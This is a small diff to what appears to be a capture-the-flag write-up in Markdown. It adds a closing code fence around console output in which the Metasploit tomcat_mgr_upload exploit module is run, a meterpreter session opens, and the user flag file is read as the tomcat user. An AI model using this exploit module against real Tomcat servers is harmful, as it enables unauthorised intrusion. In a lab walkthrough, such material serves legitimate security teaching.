@@ -96,7 +96,7 @@ msf6 exploit(multi/http/tomcat_mgr_upload) > run
 meterpreter > id
 [-] Unknown command: id. Run the help command for more details.
 meterpreter > ls
-
+```` 
 ## Get inital access as user
 
 tomcat@ubuntu:/home/jack$ cat user.txt  
